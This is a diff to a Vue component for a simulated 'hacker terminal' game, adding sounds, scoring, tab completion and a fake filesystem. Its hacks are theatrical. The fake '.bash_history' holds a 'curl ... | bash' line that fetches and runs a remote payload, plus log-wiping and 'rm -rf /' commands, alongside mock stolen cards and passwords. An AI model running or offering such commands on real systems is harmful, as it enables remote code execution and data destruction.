@@ -1,23 +1,41 @@
 <script setup lang="ts">
-import { ref, nextTick } from 'vue'
+import { ref, nextTick, computed } from 'vue'
 import { useEventListener } from '@vueuse/core'
+import HackerTyper from './HackerTyper.vue'
 
 interface OutputLine {
   text: string
   color?: string
+  reversed?: boolean
 }
 
 interface TerminalEntry {
   type: 'input' | 'output'
   content: string
   color?: string
+  reversed?: boolean
 }
 
+const props = defineProps<{
+  rageMode?: boolean
+  isPopupOpen?: boolean
+}>()
+
 const emit = defineEmits<{
-  popup: [{ title: string; lines: string[]; type: 'info' | 'warning' | 'danger' | 'success' }]
+  popup: [
+    {
+      title: string
+      lines?: string[]
+      type: 'info' | 'warning' | 'danger' | 'success' | 'cctv' | 'decrypt'
+      target?: string
+    },
+  ]
   'command-executed': [cmd: string]
+  'command-failure': []
   'processing-start': [cmd: string, variant: string]
   'processing-end': []
+  'score-update': [points: number, label: string]
+  meltdown: []
 }>()
 
 const flashActive = ref(false)
@@ -37,12 +55,73 @@ const isProcessing = ref(false)
 const commandHistory = ref<string[]>([])
 const historyIndex = ref(-1)
 
+const activePane = ref<'terminal' | 'typer'>('terminal')
+
+function focusPane(pane: 'terminal' | 'typer') {
+  activePane.value = pane
+  if (pane === 'terminal') {
+    nextTick(() => inputRef.value?.focus())
+  }
+}
+
+// ─── Web Audio API Typing Sounds ─────────────────────────
+const soundEnabled = ref(false)
+let audioCtx: AudioContext | null = null
+
+function initAudio() {
+  if (!audioCtx)
+    audioCtx = new (
+      window.AudioContext ||
+      (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext
+    )()
+  if (audioCtx.state === 'suspended') audioCtx.resume()
+}
+
+function playTyper() {
+  if (!soundEnabled.value) return
+  initAudio()
+  const osc = audioCtx!.createOscillator()
+  const gain = audioCtx!.createGain()
+  osc.type = 'square'
+  osc.frequency.setValueAtTime(600 + Math.random() * 400, audioCtx!.currentTime)
+  gain.gain.setValueAtTime(0.015, audioCtx!.currentTime)
+  gain.gain.exponentialRampToValueAtTime(0.001, audioCtx!.currentTime + 0.05)
+  osc.connect(gain)
+  gain.connect(audioCtx!.destination)
+  osc.start()
+  osc.stop(audioCtx!.currentTime + 0.05)
+}
+
+function playSuccessPing() {
+  if (!soundEnabled.value) return
+  initAudio()
+  const osc = audioCtx!.createOscillator()
+  const gain = audioCtx!.createGain()
+  osc.type = 'sine'
+  osc.frequency.setValueAtTime(800, audioCtx!.currentTime)
+  osc.frequency.exponentialRampToValueAtTime(1200, audioCtx!.currentTime + 0.1)
+  gain.gain.setValueAtTime(0.1, audioCtx!.currentTime)
+  gain.gain.exponentialRampToValueAtTime(0.001, audioCtx!.currentTime + 0.3)
+  osc.connect(gain)
+  gain.connect(audioCtx!.destination)
+  osc.start()
+  osc.stop(audioCtx!.currentTime + 0.3)
+}
+
+import { watch } from 'vue'
+watch(currentInput, () => {
+  if (!isProcessing.value && currentInput.value.length > 0) playTyper()
+})
+
 function pushOutput(lines: OutputLine[]) {
   for (const line of lines) {
+    // In rage mode, randomly reverse some output (30% chance)
+    const shouldReverse = props.rageMode && Math.random() < 0.3
     history.value.push({
       type: 'output',
-      content: line.text,
+      content: shouldReverse ? [...line.text].reverse().join('') : line.text,
       color: line.color,
+      reversed: shouldReverse,
     })
   }
 }
@@ -75,7 +154,10 @@ async function typeLine(text: string, color?: string, charDelay = 18) {
   for (let i = 1; i <= text.length; i++) {
     await sleep(charDelay)
     const cur = history.value[idx]
-    if (cur) history.value[idx] = { ...cur, content: text.slice(0, i) }
+    if (cur) {
+      history.value[idx] = { ...cur, content: text.slice(0, i) }
+      if (i % 2 === 0) playTyper()
+    }
     if (i % 8 === 0) scrollToBottom()
   }
   scrollToBottom()
@@ -135,6 +217,8 @@ async function hackSequence(target: string) {
 
   isProcessing.value = false
   emit('processing-end')
+  emit('score-update', 500, 'System Breach')
+  playSuccessPing()
   emit('popup', {
     title: `✓ HACK ${target.toUpperCase()} — THÀNH CÔNG`,
     lines: popupLines,
@@ -168,6 +252,8 @@ async function scanSequence() {
   scrollToBottom()
   isProcessing.value = false
   emit('processing-end')
+  emit('score-update', 150, 'Network Scan')
+  playSuccessPing()
   emit('popup', {
     title: '✓ SCAN — HOÀN TẤT',
     lines: ['Đã quét 8 thiết bị trong mạng nội bộ.', ''],
@@ -198,6 +284,8 @@ async function ddosSequence(target: string) {
   scrollToBottom()
   isProcessing.value = false
   emit('processing-end')
+  emit('score-update', 350, 'DDoS Attack')
+  playSuccessPing()
   emit('popup', {
     title: `⚡ DDOS ${target.toUpperCase()} — THÀNH CÔNG`,
     lines: [
@@ -222,6 +310,8 @@ async function bruteforceSequence(ip: string) {
   const foundPass = ['admin123', 'root2024', 'password!', 'q1w2e3r4'][Math.floor(Math.random() * 4)]
   isProcessing.value = false
   emit('processing-end')
+  emit('score-update', 400, 'SSH Cracked')
+  playSuccessPing()
   emit('popup', {
     title: `🔓 BRUTEFORCE — ĐÃ CÓ MẬT KHẨU`,
     lines: [`Host: ${targetIp}:22`, `User: root`, `Pass: ${foundPass}`, `Method: Dictionary`],
@@ -240,6 +330,8 @@ async function exploitSequence(cve: string) {
   await sleep(2800)
   isProcessing.value = false
   emit('processing-end')
+  emit('score-update', 600, 'RCE Exploit')
+  playSuccessPing()
   emit('popup', {
     title: `💣 EXPLOIT ${cveName} — THÀNH CÔNG`,
     lines: [
@@ -261,7 +353,9 @@ async function tracerouteSequence(target: string) {
   await sleep(2500)
   isProcessing.value = false
   emit('processing-end')
+  emit('score-update', 100, 'Route Mapped')
   const hops = Math.floor(Math.random() * 8 + 6)
+  playSuccessPing()
   emit('popup', {
     title: `🌐 TRACEROUTE — HOÀN TẤT`,
     lines: [
@@ -286,6 +380,8 @@ async function crackSequence(hash: string) {
   const found = results[Math.floor(Math.random() * results.length)]
   isProcessing.value = false
   emit('processing-end')
+  emit('score-update', 300, 'Hash Cracked')
+  playSuccessPing()
   emit('popup', {
     title: `🔑 CRACK — ĐÃ TìM THẤY`,
     lines: [
@@ -316,6 +412,8 @@ const COMMANDS: Record<string, (args: string[]) => void | Promise<void>> = {
       { text: '  decrypt <str>        — Mã hóa chuỗi          [🔐]', color: '#00ff4199' },
       { text: '  status               — Trạng thái hệ thống', color: '#00ff4199' },
       { text: '  whoami               — Thông tin người dùng', color: '#00ff4199' },
+      { text: '  matrix               — Bật/tắt hiệu ứng ma trận', color: '#00ff4199' },
+      { text: '  sudo <cmd>           — Chạy với quyền admin    [⚠]', color: '#ff333399' },
       { text: '  clear                — Xóa màn hình', color: '#00ff4199' },
       { text: '╚══════════════════════════════════════════╝', color: '#00ff4160' },
     ])
@@ -324,9 +422,34 @@ const COMMANDS: Record<string, (args: string[]) => void | Promise<void>> = {
   hack: async (args) => {
     const target = args[0]
     if (!target) {
-      pushOutput([{ text: '[!] Cú pháp: hack -<target>  (vd: hack -nasa)', color: '#ff6b35' }])
+      pushOutput([
+        { text: '[!] Cú pháp: hack -<target>  (vd: hack -nasa, hack -cctv)', color: '#ff6b35' },
+      ])
       return
     }
+
+    if (target.replace('-', '') === 'cctv') {
+      const camId = args[1] || Math.floor(Math.random() * 9999).toString()
+      isProcessing.value = true
+      await typeLine(`[*] Đang dò tìm tín hiệu an ninh khu vực...`, '#ffb830')
+      await sleep(500)
+      emit('processing-start', `hack -cctv`, 'pulse')
+      await sleep(1500)
+
+      isProcessing.value = false
+      emit('processing-end')
+      emit('score-update', 300, 'CCTV Hijacked')
+      playSuccessPing()
+      emit('popup', {
+        title: `👁 CCTV HACKED — CAM-${camId}`,
+        type: 'cctv',
+        target: camId,
+      })
+      await typeLine(`[+] Truy cập luồng Video thành công.`, '#00ff41')
+      scrollToBottom()
+      return
+    }
+
     await hackSequence(target.replace('-', ''))
   },
 
@@ -358,6 +481,14 @@ const COMMANDS: Record<string, (args: string[]) => void | Promise<void>> = {
   },
 
   decrypt: (args) => {
+    if (args[0] === '-crack') {
+      emit('popup', {
+        title: 'BẮT ĐẦU GIẢI MÃ HỆ THỐNG',
+        type: 'decrypt',
+      })
+      pushOutput([{ text: '[*] Khởi động Module Decrypt...', color: '#00d4ff' }])
+      return
+    }
     decryptSequence(args.join(' '))
   },
 
@@ -399,7 +530,212 @@ const COMMANDS: Record<string, (args: string[]) => void | Promise<void>> = {
   clear: () => {
     history.value = []
   },
+
+  sudo: async (args) => {
+    const fullCmd = args.join(' ')
+    if (fullCmd === 'rm -rf /') {
+      isProcessing.value = true
+      await typeLine('[!] WARNING: EXECUTING SYSTEM DESTRUCTION...', '#ff3333')
+      await sleep(1000)
+      await typeLine('[!] UNRECOVERABLE DATA LOSS IMMINENT...', '#ff3333')
+      await sleep(1000)
+      await typeLine('[!] BYE BYE...', '#ff3333')
+      emit('meltdown')
+      // Let the parent handle the rest (melting/redirecting)
+    } else {
+      pushOutput([{ text: `[!] Permission denied: ${fullCmd}`, color: '#ff3333' }])
+    }
+  },
 }
+
+// \u2500\u2500\u2500 Fake file system \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+interface FsNode {
+  type: 'dir' | 'file'
+  content?: string
+  children?: Record<string, FsNode>
+}
+
+const FS: FsNode = {
+  type: 'dir',
+  children: {
+    home: {
+      type: 'dir',
+      children: {
+        root: {
+          type: 'dir',
+          children: {
+            'readme.txt': {
+              type: 'file',
+              content:
+                'Ch\u00e0o m\u1eebng \u0111\u1ebfn v\u1edbi MATRIX OS v13.37\nGo to /etc for config files.\nGo to /var/log for logs.',
+            },
+            '.bash_history': {
+              type: 'file',
+              content:
+                'ssh root@192.168.1.1\nsudo su\nrm -rf /var/log/*\nnmap -sV 10.0.0.0/24\ncurl http://darkweb.onion/payload.sh | bash',
+            },
+            loot: {
+              type: 'dir',
+              children: {
+                'credits.db': {
+                  type: 'file',
+                  content:
+                    'VISA: 4532-XXXX-XXXX-7821  CVV: 421  EXP: 12/27\nVISA: 4916-XXXX-XXXX-3392  CVV: 819  EXP: 09/26\n[...2,847 more records]',
+                },
+                'passwords.txt': {
+                  type: 'file',
+                  content:
+                    'admin:Adm!n2024\nroot:toor123!\nnasa_sysadmin:n@s@P@ss!\nfbi_agent_007:F3d3ral!\n[...142 more]',
+                },
+              },
+            },
+          },
+        },
+      },
+    },
+    etc: {
+      type: 'dir',
+      children: {
+        passwd: {
+          type: 'file',
+          content:
+            'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/sbin/nologin\nhacker:x:1337:1337::/home/hacker:/bin/zsh',
+        },
+        shadow: {
+          type: 'file',
+          content: 'root:$6$salt$H5P8k6Q1V...LOCKED\nhacker:$6$r4nd0m$X9Z2...:19800:0:99999:7:::',
+        },
+        hosts: {
+          type: 'file',
+          content:
+            '127.0.0.1  localhost\n10.0.0.1   gateway.matrix.local\n192.168.1.100  target-server.local\n185.220.101.45 tor-exit.anon',
+        },
+        ssh: {
+          type: 'dir',
+          children: {
+            id_rsa: {
+              type: 'file',
+              content:
+                '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0+mVhFe9uCTMOXNsZFhbbPpZZ....\n[2048-bit private key]\n-----END RSA PRIVATE KEY-----',
+            },
+          },
+        },
+      },
+    },
+    var: {
+      type: 'dir',
+      children: {
+        log: {
+          type: 'dir',
+          children: {
+            'auth.log': {
+              type: 'file',
+              content:
+                'Mar 11 09:01:22 sshd[1337]: Accepted password for root from 185.220.101.45\nMar 11 09:02:11 sudo: root: TTY=pts/0 ; CMD=/bin/bash\nMar 11 09:03:45 sshd[1414]: Failed password for admin from 45.33.32.156 port 22',
+            },
+            syslog: {
+              type: 'file',
+              content:
+                '[WARN] Firewall rule bypassed from 10.0.0.254\n[INFO] TOR circuit established\n[CRIT] Intrusion detected: payload injection attempt\n[INFO] IDS disabled by root',
+            },
+          },
+        },
+      },
+    },
+  },
+}
+
+const currentPath = ref(['']) // starts at /
+const currentPathStr = computed(() => '/' + currentPath.value.filter(Boolean).join('/'))
+
+function getNode(path: string[]): FsNode | null {
+  let node: FsNode = FS
+  for (const seg of path.filter(Boolean)) {
+    if (node.type !== 'dir' || !node.children?.[seg]) return null
+    node = node.children[seg]!
+  }
+  return node
+}
+
+Object.assign(COMMANDS, {
+  pwd: () => {
+    pushOutput([{ text: currentPathStr.value, color: '#00d4ff' }])
+  },
+
+  ls: (args: string[]) => {
+    const targetPath = args[0]
+      ? args[0].startsWith('/')
+        ? args[0].slice(1).split('/')
+        : [...currentPath.value, args[0]]
+      : currentPath.value
+    const node = getNode(targetPath)
+    if (!node || node.type !== 'dir') {
+      pushOutput([
+        {
+          text: `ls: cannot access '${args[0] ?? currentPathStr.value}': No such file or directory`,
+          color: '#ff3333',
+        },
+      ])
+      return
+    }
+    const entries = Object.entries(node.children ?? {})
+    if (entries.length === 0) {
+      pushOutput([{ text: '(empty)', color: '#00ff4160' }])
+      return
+    }
+    pushOutput([{ text: `total ${entries.length}`, color: '#00ff4160' }])
+    entries.forEach(([name, n]) => {
+      const isDir = n.type === 'dir'
+      pushOutput([
+        {
+          text: `${isDir ? 'drwxr-xr-x' : '-rw-r--r--'}  root root  ${isDir ? '<DIR>' : `${Math.floor(Math.random() * 9000 + 200)} B`}  ${name}${isDir ? '/' : ''}`,
+          color: isDir ? '#00d4ff' : '#00ff41',
+        },
+      ])
+    })
+  },
+
+  cd: (args: string[]) => {
+    const target = args[0]
+    if (!target || target === '/') {
+      currentPath.value = ['']
+      return
+    }
+    if (target === '..') {
+      if (currentPath.value.length > 1) currentPath.value = currentPath.value.slice(0, -1)
+      return
+    }
+    const newPath = target.startsWith('/')
+      ? target.slice(1).split('/')
+      : [...currentPath.value, target]
+    const node = getNode(newPath)
+    if (!node) {
+      pushOutput([{ text: `cd: ${target}: No such file or directory`, color: '#ff3333' }])
+    } else if (node.type !== 'dir') {
+      pushOutput([{ text: `cd: ${target}: Not a directory`, color: '#ff3333' }])
+    } else {
+      currentPath.value = newPath
+    }
+  },
+
+  cat: (args: string[]) => {
+    const name = args[0]
+    if (!name) {
+      pushOutput([{ text: 'cat: missing operand', color: '#ff3333' }])
+      return
+    }
+    const filePath = name.startsWith('/') ? name.slice(1).split('/') : [...currentPath.value, name]
+    const node = getNode(filePath)
+    if (!node) {
+      pushOutput([{ text: `cat: ${name}: No such file or directory`, color: '#ff3333' }])
+    } else if (node.type === 'dir') {
+      pushOutput([{ text: `cat: ${name}: Is a directory`, color: '#ff3333' }])
+    } else {
+      const lines = (node.content ?? '').split('\n')
+      lines.forEach((l) => pushOutput([{ text: l, color: '#00ff41' }]))
+    }
+  },
+})
 
 async function executeCommand(raw: string) {
   const trimmed = raw.trim()
@@ -417,25 +753,34 @@ async function executeCommand(raw: string) {
   const cmd = parts[0]?.toLowerCase() ?? ''
   const args = parts.slice(1)
 
-  const handler = COMMANDS[cmd]
-  if (handler) {
-    await handler(args)
+  const fullCmd = trimmed
+  if (COMMANDS[cmd]) {
+    await COMMANDS[cmd](args)
+    emit('command-executed', fullCmd)
   } else {
-    pushOutput([{ text: `bash: ${cmd}: command not found`, color: '#ff3333' }])
+    pushOutput([
+      {
+        text: props.rageMode
+          ? `[CRIT] COMMAND NOT FOUND: ${cmd}`
+          : `bash: ${cmd}: command not found`,
+        color: '#ff3333',
+      },
+    ])
+    emit('command-failure')
   }
   scrollToBottom()
 }
 
 async function handleEnter() {
-  if (isProcessing.value) return
+  if (isProcessing.value || props.isPopupOpen) return
   const val = currentInput.value
   currentInput.value = ''
   triggerFlash()
-  emit('command-executed', val.trim())
   await executeCommand(val)
 }
 
 useEventListener(document, 'keydown', (e: KeyboardEvent) => {
+  if (activePane.value !== 'terminal' || props.isPopupOpen) return
   if (inputRef.value && document.activeElement !== inputRef.value) {
     if (!['F1', 'F2', 'F3', 'F4', 'F5', 'F12', 'Tab'].includes(e.key)) {
       inputRef.value.focus()
@@ -443,7 +788,59 @@ useEventListener(document, 'keydown', (e: KeyboardEvent) => {
   }
 })
 
+// ─── Tab completion ──────────────────────────────────────────
+const ALL_COMMANDS = [
+  'hack',
+  'hack -nasa',
+  'hack -pentagon',
+  'hack -bank',
+  'hack -fbi',
+  'hack -cctv',
+  'ddos',
+  'ddos -cloudflare',
+  'ddos -microsoft',
+  'scan',
+  'bruteforce',
+  'bruteforce -ssh',
+  'exploit',
+  'exploit -ms17-010',
+  'exploit -log4shell',
+  'traceroute',
+  'traceroute google.com',
+  'crack',
+  'decrypt',
+  'decrypt -crack',
+  'status',
+  'whoami',
+  'clear',
+  'help',
+  'sudo rm -rf /',
+]
+const tabMatches = ref<string[]>([])
+const tabIdx = ref(0)
+
 function handleKeydown(e: KeyboardEvent) {
+  if (props.isPopupOpen) return
+
+  if (e.key === 'Tab') {
+    e.preventDefault()
+    const val = currentInput.value.trim()
+    if (!val) return
+    // Build or cycle matches
+    if (tabMatches.value.length === 0 || !tabMatches.value.some((m) => m.startsWith(val))) {
+      tabMatches.value = ALL_COMMANDS.filter((c) => c.startsWith(val))
+      tabIdx.value = 0
+    } else {
+      tabIdx.value = (tabIdx.value + 1) % tabMatches.value.length
+    }
+    if (tabMatches.value.length > 0) {
+      currentInput.value = tabMatches.value[tabIdx.value] ?? val
+    }
+    return
+  }
+  // Reset tab on any other key
+  if (e.key !== 'Shift') tabMatches.value = []
+
   if (e.key === 'ArrowUp') {
     e.preventDefault()
     const newIdx = Math.min(historyIndex.value + 1, commandHistory.value.length - 1)
@@ -491,31 +888,74 @@ pushOutput([
 
     <!-- Body: left output + right sidebar -->
     <div class="terminal-body">
-      <!-- ── LEFT: Output + Input ── -->
-      <div class="terminal-main">
-        <div ref="outputRef" class="terminal-output">
-          <TransitionGroup name="line" tag="div">
-            <div v-for="(entry, i) in history" :key="i" class="term-line">
-              <template v-if="entry.type === 'input'">
-                <span class="prompt">root@matrix:~# </span>
-                <span class="input-echo">{{ entry.content }}</span>
-              </template>
-              <template v-else>
-                <span :style="{ color: entry.color ?? '#00ff41' }">{{ entry.content }}</span>
-              </template>
-            </div>
-          </TransitionGroup>
+      <!-- ── LEFT MAIN (Top/Bottom Split) ── -->
+      <div class="terminal-left-side">
+        <!-- ── TOP: Hacker Typer ── -->
+        <div
+          class="terminal-typer-col"
+          :class="{ 'pane-active': activePane === 'typer' }"
+          @click="focusPane('typer')"
+        >
+          <HackerTyper :active="activePane === 'typer'" />
+        </div>
 
-          <!-- Current input line -->
-          <div v-if="!isProcessing" class="term-line">
-            <span class="prompt">root@matrix:~# </span>
-            <span class="cursor-line">
-              <span>{{ currentInput }}</span>
-              <span class="cursor-blink">█</span>
-            </span>
-          </div>
-          <div v-else class="term-line">
-            <span style="color: #ffb83080">Đang xử lý...</span>
+        <!-- ── BOTTOM: Terminal Output + Input ── -->
+        <div
+          class="terminal-main"
+          :class="{ 'pane-active': activePane === 'terminal' }"
+          @click="focusPane('terminal')"
+        >
+          <div ref="outputRef" class="terminal-output">
+            <TransitionGroup name="line" tag="div">
+              <div v-for="(entry, i) in history" :key="i" class="term-line">
+                <template v-if="entry.type === 'input'">
+                  <span class="prompt"
+                    >{{ props.rageMode ? '[RAGE] root@matrix' : 'root@matrix' }}:{{
+                      currentPathStr
+                    }}#
+                  </span>
+                  <span
+                    class="input-echo"
+                    :style="{ color: props.rageMode ? '#ff3333' : 'inherit' }"
+                    >{{ entry.content }}</span
+                  >
+                </template>
+                <template v-else>
+                  <span
+                    :style="{
+                      color:
+                        props.rageMode && !entry.color ? '#ff3333' : (entry.color ?? '#00ff41'),
+                      direction: entry.reversed ? 'rtl' : 'ltr',
+                    }"
+                    >{{ entry.content }}</span
+                  >
+                </template>
+              </div>
+            </TransitionGroup>
+
+            <!-- Current input line -->
+            <div v-if="!isProcessing" class="term-line">
+              <span class="prompt"
+                >{{ props.rageMode ? '[RAGE] root@matrix' : 'root@matrix' }}:{{ currentPathStr }}#
+              </span>
+              <span class="cursor-line">
+                <span :style="{ color: props.rageMode ? '#ff3333' : 'inherit' }">{{
+                  currentInput
+                }}</span>
+                <span
+                  v-if="activePane === 'terminal'"
+                  class="cursor-blink"
+                  :style="{ color: props.rageMode ? '#ff3333' : '#00ff41' }"
+                  >█</span
+                >
+                <span v-else class="cursor-idle">█</span>
+              </span>
+            </div>
+            <div v-else class="term-line">
+              <span :style="{ color: props.rageMode ? '#ff3333' : '#ffb83080' }">{{
+                props.rageMode ? 'ATTACKING...' : 'Đang xử lý...'
+              }}</span>
+            </div>
           </div>
         </div>
       </div>
@@ -531,6 +971,9 @@ pushOutput([
             <span class="sb-k">CMDS</span><span class="sb-v g">{{ commandHistory.length }}</span>
           </div>
           <div class="sb-row"><span class="sb-k">VPN</span><span class="sb-v g">TOR ✓</span></div>
+          <div class="sb-row">
+            <span class="sb-k">DIR</span><span class="sb-v dir-val">{{ currentPathStr }}</span>
+          </div>
           <div class="sb-row">
             <span class="sb-k">STATUS</span>
             <span :class="isProcessing ? 'sb-v warn' : 'sb-v g'">
@@ -596,9 +1039,8 @@ pushOutput([
       class="hidden-input"
       autocomplete="off"
       autocorrect="off"
-      autocapitalize="off"
       spellcheck="false"
-      :disabled="isProcessing"
+      :disabled="isProcessing || activePane !== 'terminal'"
       @keydown.enter="handleEnter"
       @keydown="handleKeydown"
     />
@@ -649,11 +1091,38 @@ pushOutput([
   display: grid;
   grid-template-columns: 1fr 200px;
 }
-.terminal-main {
+.terminal-left-side {
   display: flex;
   flex-direction: column;
   min-height: 0;
   border-right: 1px solid rgba(0, 255, 65, 0.1);
+}
+.terminal-typer-col {
+  flex: 3; /* top half takes more space */
+  display: flex;
+  flex-direction: column;
+  min-height: 0;
+  border: 1px solid transparent;
+  border-bottom: 1px solid rgba(0, 255, 65, 0.1);
+  transition: all 0.2s;
+  cursor: pointer;
+  opacity: 0.6;
+}
+.terminal-main {
+  flex: 2; /* bottom half takes less space */
+  display: flex;
+  flex-direction: column;
+  min-height: 0;
+  border: 1px solid transparent;
+  transition: all 0.2s;
+  cursor: pointer;
+  opacity: 0.6;
+}
+.pane-active {
+  opacity: 1;
+  border-color: rgba(0, 255, 65, 0.3);
+  box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.05);
+  cursor: default;
 }
 .terminal-titlebar {
   display: flex;
@@ -757,6 +1226,9 @@ pushOutput([
   color: #00ff41;
   animation: blink 1s step-end infinite;
 }
+.cursor-idle {
+  color: rgba(0, 255, 65, 0.3);
+}
 @keyframes blink {
   0%,
   100% {
@@ -817,6 +1289,16 @@ pushOutput([
 }
 .sb-v.warn {
   color: #ffb830;
+}
+.dir-val {
+  color: #00d4ff;
+  font-size: 9px;
+  max-width: 110px;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  direction: rtl;
+  text-align: right;
 }
 
 /* History list */
